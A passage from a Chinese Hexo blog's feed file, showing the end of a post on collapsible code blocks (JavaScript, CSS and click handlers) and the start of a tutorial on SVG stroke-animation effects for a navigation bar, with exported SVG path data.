#9CDCFE">lang</span><span style="color: #D4D4D4">, </span><span style="color: #9CDCFE">end</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">collapseId</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">`collapse-</span><span style="color: #569CD6">${</span><span style="color: #DCDCAA">getUuid</span><span style="color: #D4D4D4">()</span><span style="color: #569CD6">}</span><span style="color: #CE9178">`</span><span style="color: #D4D4D4">;</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">collapseContainer</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">`</span></span><span class="line"><span style="color: #CE9178">        &lt;div class="collapse-header" data-toggle="collapse" data-target="#</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">collapseId</span><span style="color: #569CD6">}</span><span style="color: #CE9178">"&gt;</span></span><span class="line"><span style="color: #CE9178">          &lt;button class="collapse-btn collapsed" type="button"&gt;</span></span><span class="line"><span style="color: #CE9178">            &lt;svg t="1730562455310" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="9905"&gt;</span></span><span class="line"><span style="color: #CE9178">              &lt;path d="M857.766234 511.488511L345.623017 0 297.174825 49.348412 759.846873 511.488511 297.174825 974.651588 345.623017 1022.977023z" fill="#ffffff" p-id="9906"&gt;&lt;/path&gt;</span></span><span class="line"><span style="color: #CE9178">            &lt;/svg&gt;</span></span><span class="line"><span style="color: #CE9178">          &lt;/button&gt;</span></span><span class="line"><span style="color: #CE9178">          &lt;span&gt;</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">lang</span><span style="color: #569CD6">}</span><span style="color: #CE9178">&lt;/span&gt;</span></span><span class="line"><span style="color: #CE9178">        &lt;/div&gt;</span></span><span class="line"><span style="color: #CE9178">      `</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">collapseDiv</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">`&lt;div class="collapse" id="</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">collapseId</span><span style="color: #569CD6">}</span><span style="color: #CE9178">"&gt;</span><span style="color: #569CD6">${</span><span style="color: #9CDCFE">inner</span><span style="color: #569CD6">}</span><span style="color: #CE9178">&lt;/div&gt;`</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">begin</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">collapseContainer</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">collapseDiv</span><span style="color: #D4D4D4"> + </span><span style="color: #9CDCFE">end</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    });</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">data</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #B5CEA8">10000</span></span><span class="line"><span style="color: #D4D4D4">);</span></span></code></pre></div></div></figure><p><code>codeFloding.css</code>：增加了鼠标悬停在 header 时，将鼠标样式改为 pointer 提示用户</p><figure class="shiki css"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D7BA7D">.collapse-header</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-radius</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 设置圆角，使背景更柔和 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">relative</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 使按钮可以定位 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">z-index</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#303030</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 设置背景颜色为深灰色 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 添加上下左右各5px的内边距 */</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">cursor</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">pointer</span><span style="color: #D4D4D4">; </span><span style="color: #6A9955">/* 鼠标悬停时显示为手指光标 */</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D4D4D4">..</span><span style="color: #D7BA7D">.略</span><span style="color: #D4D4D4">...</span></span></code></pre></div></div></figure><p><code>watch.js</code></p><figure class="shiki js"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">/**</span></span><span class="line"><span style="color: #6A9955"> * 给代码收起按钮和整个 header 添加监听事件</span></span><span class="line"><span style="color: #6A9955"> */</span></span><span class="line"><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">collapseHeaders</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">document</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">querySelectorAll</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'.collapse-header'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #9CDCFE">collapseHeaders</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">forEach</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">header</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">button</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">header</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">querySelector</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'button'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">codeTypeSpan</span><span style="color: #D4D4D4"> = </span><span style="color: #9CDCFE">header</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">querySelector</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'span'</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">header</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">addEventListener</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'click'</span><span style="color: #D4D4D4">, () </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'header clicked'</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">    </span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 手动切换按钮的类名</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">button</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">classList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">toggle</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'collapsed'</span><span style="color: #D4D4D4">);</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 根据按钮状态显示或隐藏 span</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">if</span><span style="color: #D4D4D4"> (</span><span style="color: #9CDCFE">button</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">classList</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">contains</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'collapsed'</span><span style="color: #D4D4D4">)) {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log('收起代码块');</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">codeTypeSpan</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">style</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">'inline-block'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #6A9955">// console.log('展开代码块');</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">codeTypeSpan</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">style</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4"> = </span><span style="color: #CE9178">'none'</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">button</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">addEventListener</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">'click'</span><span style="color: #D4D4D4">, (</span><span style="color: #9CDCFE">event</span><span style="color: #D4D4D4">) </span><span style="color: #569CD6">=&gt;</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 阻止事件冒泡，避免触发 header 的点击事件</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">event</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">stopPropagation</span><span style="color: #D4D4D4">();</span></span><span class="line"><span style="color: #D4D4D4">  });</span></span><span class="line"><span style="color: #D4D4D4">});</span></span></code></pre></div></div></figure><div class="note info flat"><p>以上内容若有侵权，可联系删除</p></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美化 </tag>
            
            <tag> Hexo </tag>
            
            <tag> Fluid </tag>
            
            <tag> Bootstrap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 CSS 和 JS 实现博客导航栏线条动画效果</title>
      <link href="/posts/38001.html"/>
      <url>/posts/38001.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><meta name="description" content="使用CSS和JS给博客导航栏加上线条动画/路径动画效果。"><h2 id="原理"><a class="markdownIt-Anchor" href="#原理"></a> 原理</h2><p>SVG 描边动画（stroke animation）是一种通过控制 SVG 元素的描边（<code>stroke</code>）属性，让路径逐步显示出来，产生 “手写” 或 “线条绘制” 的视觉效果。它的核心是使用：</p><ul><li><code>stroke-dasharray</code>：设置虚线的模式，等同于 “路径总长”，将整个路径打散成可动画的虚线段。</li><li><code>stroke-dashoffset</code>：设置虚线的偏移距离，将整条线 “推出可见范围”，通过动画逐渐归零，就像笔迹被画出来一样。</li><li><code>@keyframes</code>：通过 CSS 的 <code>@keyframes</code> 或 JS 动态设置这两个属性，实现逐步描边。</li></ul><p>这样就能模拟路径从无到有的 “被画出” 的过程。所以首先我们得准备好一个能用的 SVG 图（<a href="https://www.runoob.com/svg/svg-intro.html">什么是 SVG？</a>）。</p><h3 id="方法一"><a class="markdownIt-Anchor" href="#方法一"></a> 方法一</h3><p>你可以使用 Adobe 的 adobe illustrator 来徒手绘制 svg 图。</p><p>怎么操作呢，就是创建好画布之后直接使用铅笔 / 钢笔 / 画笔等工具进行一个手画。</p><p>例如使用铅笔工具：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020452346.png" alt="image-20241102045227167"></p><p>左边能看到路径锚点，右边能看到各个图层。</p><p>紧接着将其导出为 svg：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020454590.png" alt="image-20241102045454543"></p><table><thead><tr><th>选项</th><th>推荐设置</th></tr></thead><tbody><tr><td>样式</td><td><strong>内部 CSS</strong></td></tr><tr><td> 字体</td><td><strong>转换为轮廓</strong></td></tr><tr><td>图像</td><td><strong>保留</strong>（无图也行）</td></tr><tr><td>对象 ID</td><td><strong> 保留</strong>（方便调试）</td></tr><tr><td>小数位数</td><td><strong> 3</strong></td></tr></tbody></table><p>点击显示代码，它将调用文本编辑器让你提前查看。</p><p>svgd 代码大致是：</p><figure class="shiki xml"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">svg</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">xmlns</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"http://www.w3.org/2000/svg"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">viewBox</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"0 0 232.798 65.792"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">defs</span><span style="color: #808080">&gt;&lt;</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">.a{fill:none;stroke:#000;stroke-miterlimit:10;}</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">style</span><span style="color: #808080">&gt;&lt;/</span><span style="color: #569CD6">defs</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">title</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">未标题-1</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">title</span><span style="color: #808080">&gt;&lt;</span><span style="color: #569CD6">path</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"a"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">d</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"M166.57,148.587c-7.072.465-13.436,4.25-19.491,7.933-3.19,1.941-6.427,3.92-8.947,6.676-2.646,2.9-4.364,6.5-6.044,10.041-2.088,4.406-4.207,9.467-2.374,13.985a16.6,16.6,0,0,0,3.792,5.134,131.478,131.478,0,0,0,11.071,10.113,10.374,10.374,0,0,0,4.293,2.435,10.787,10.787,0,0,0,4.654-.435l18.454-4.506a.6.6,0,0,0-.954-.537"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"translate(-128.515 -144.528)"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">path</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"a"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">d</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"M185.9,171.121a4.907,4.907,0,0,1,3.356,3.268"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"translate(-128.515 -144.528)"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">path</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"a"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">d</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"M184.46,189.411a72.961,72.961,0,0,1,2.635,20.9"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"translate(-128.515 -144.528)"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">path</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"a"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">d</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"M224.639,195.225a13.226,13.226,0,0,0-2.332-4.606,4.5,4.5,0,0,0-4.659-1.511,6.49,6.49,0,0,0-1.927,1.276q-3.384,2.889-6.612,5.953c-1.78,1.689-3.616,4.431-2.06,6.329a5.055,5.055,0,0,0,3.076,1.384,15.353,15.353,0,0,0,5.2.412,5.2,5.2,0,0,0,4.119-2.853c.621-1.5.234-3.2.241-4.829a9.808,9.808,0,0,1,1.229-4.7c.318,2.958.662,6,2.08,8.618s4.193,4.726,7.154,4.442"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"translate(-128.515 -144.528)"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">path</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"a"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">d</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"M264.978,149.682q-5.542,20.928-9.175,42.3a5.173,5.173,0,0,0,.306,3.722,4.7,4.7,0,0,0,2.181,1.548,25.766,25.766,0,0,0,8.293,2.02"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"translate(-128.515 -144.528)"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">path</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"a"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">d</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"M301.091,144.6c-1.35,8.821-2.7,17.644-3.829,26.5-.958,7.52-1.743,15.268.208,22.594.763,2.864,2.659,6.114,5.619,5.968"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"translate(-128.515 -144.528)"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">path</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">class</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"a"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">d</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"M355.807,194.125c2.7-2.028,4.855-5.064,5-8.441.477-11.264-19.128-16.029-23.575-5.714-1.68,3.9-.743,11.83,1.3,15.42C342.345,202.118,350.785,197.892,355.807,194.125Z"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"translate(-128.515 -144.528)"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">svg</span><span style="color: #808080">&gt;</span></span></code></pre></div></div></figure><p>在导出的 svg 代码中，我们最关心的是：</p><ul><li>有 <code>stroke</code> 且 <code>fill="none"</code>：动画只作用于描边部分，必须明确设置无填充</li><li>有使用到 <code>&lt;path&gt;</code> 元素：做描边动画的图形元素，支持路径长度计算</li><li>有 <code>viewBox</code>：在不同尺寸下能比例正确</li></ul><h3 id="方法二"><a class="markdownIt-Anchor" href="#方法二"></a> 方法二</h3><p>你也可以使用 adobe illustrator 的文字工具指定字体，来生成好看的字体效果，例如：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020501894.png" alt="image-20241102050103841"></p><p>这个时候你只需要用选择工具，框选文字转换轮廓就可以得到复杂路径图层：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020502168.png" alt="image-20241102050239120"></p><p>创建之后，按住 ctrl 键，你会发现文字上就出现了许多路径锚点：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020503277.png" alt="image-20241102050353227"></p><p>图层中也自动有了每个字母的复合路径：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411020504918.png" alt="image-20241102050435882"></p><p>可以和方法一一样直接导出了。</p><figure class="shiki xml"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">svg</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">xmlns</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"http://www.w3.org/2000/svg"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">viewBox</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"0 0 203 74.13"</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">title</span><span style="color: #808080">&gt;</span><span style="color: #D4D4D4">未标题-1</span><span style="color: #808080">&lt;/</span><span style="color: #569CD6">title</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">path</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">d</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"M259.914,163.879c1.1-.439,16.567-6.8,17-16.9,0-.109,1.537-6.144-12.835-6.693-26.661-.987-52,20.956-52.662,41.362,0,1.536-2.634,24.027,22.82,24.905S281.2,189.881,281.2,189.881s.987-.878,1.536.219c0,.11.22,2.085-3.511,5.266-1.206,1.1-21.722,15.909-43.556,15.031-16.456-.658-29.4-9-28.635-28.855.769-22.491,28.526-46.3,56.832-45.2,1.1,0,17.225.22,17.334,10.422.11,10.094-15.8,18.981-17.225,19.749-1.426.878-5.375,2.413-6.472.109C256.513,164.647,257.72,164.647,259.914,163.879Z"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"translate(-207 -136.305)"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">path</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">d</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"M294.358,202.717c-8.557.11-9.435-10.094-9.216-12.069.22-2.413,1.1-7.35,1.1-7.35.768-1.975,4.168-1.756,4.168.219,0,.549-4.168,16.018,4.389,15.579,5.815-.22,11.3-10.093,13.824-14.7.987-1.865,2.523.658.329,5.046C308.182,190.978,302.147,202.717,294.358,202.717Zm-3.291-27.537a2.882,2.882,0,0,1-3.292,2.413,2.787,2.787,0,0,1-2.413-3.182c0-.987,1.1-3.73,3.4-3.4C291.177,171.339,291.286,173.643,291.067,175.18Z"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"translate(-207 -136.305)"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">path</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">d</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"M327.82,202.278c-6.584.109-7.571-6.582-7.571-6.582s-3.95,7.24-7.79,7.131c-2.084,0-7.35-1.865-6.033-12.179s8.228-14.921,11.739-14.81c6.363.218,5.815,5.7,5.7,6.253-.877,2.853-1.974,2.084-2.742,1.755,0,0,.658-4.608-3.072-4.717-3.181-.11-6.363,4.717-7.46,9.654-1.207,5.047-.439,10.2,2.193,10.2,4.06,0,7.461-10.972,7.9-13.714.218-1.1,4.278-.22,4.058,1.535-.109,0-4.058,11.739,3.292,11.739,3.292,0,7.57-3.4,13.383-14.043.989-1.755,2.526.769.221,5.048C339.779,193.063,334.292,202.169,327.82,202.278Z"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"translate(-207 -136.305)"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">path</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">d</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"M361.938,184.615c1.1-1.756,2.523.767.218,5.046-.768,1.536-6.582,13.6-17.223,13.056-12.947-.659-13.275-15.031-13.166-27.1.108-10.642,6.472-32.365,14.92-31.817,5.376.329,7.352,6.912,5.7,17.664-2.084,14.591-10.642,28.964-14.153,33.024,1.976,3.071,4.718,4.936,7.9,4.936C354.148,199.425,359.414,189.223,361.938,184.615Zm-15.36-36.754c-4.17-.329-10.093,13.165-11.519,27.977-.331,4.5.327,12.068,1.754,16.017,5.7-8.228,7.462-12.507,11.411-28.086C348.992,160.917,350.747,148.08,346.578,147.861Z"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"translate(-207 -136.305)"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">path</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">d</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"M382.561,184.615c1.1-1.756,2.524.767.219,5.046-.768,1.536-6.582,13.6-17.223,13.056-12.948-.659-13.275-15.031-13.166-27.1.108-10.642,6.472-32.365,14.92-31.817,5.376.329,7.352,6.912,5.705,17.664-2.084,14.591-10.643,28.964-14.153,33.024,1.976,3.071,4.718,4.936,7.9,4.936C374.771,199.425,380.038,189.223,382.561,184.615ZM367.2,147.861c-4.171-.329-10.093,13.165-11.519,27.977-.331,4.5.327,12.068,1.753,16.017,5.706-8.228,7.463-12.507,11.411-28.086C369.616,160.917,371.371,148.08,367.2,147.861Z"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"translate(-207 -136.305)"</span><span style="color: #808080">/&gt;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #808080">&lt;</span><span style="color: #569CD6">path</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">d</span><span style="color: #D4D4D4">=</span><span style="color: 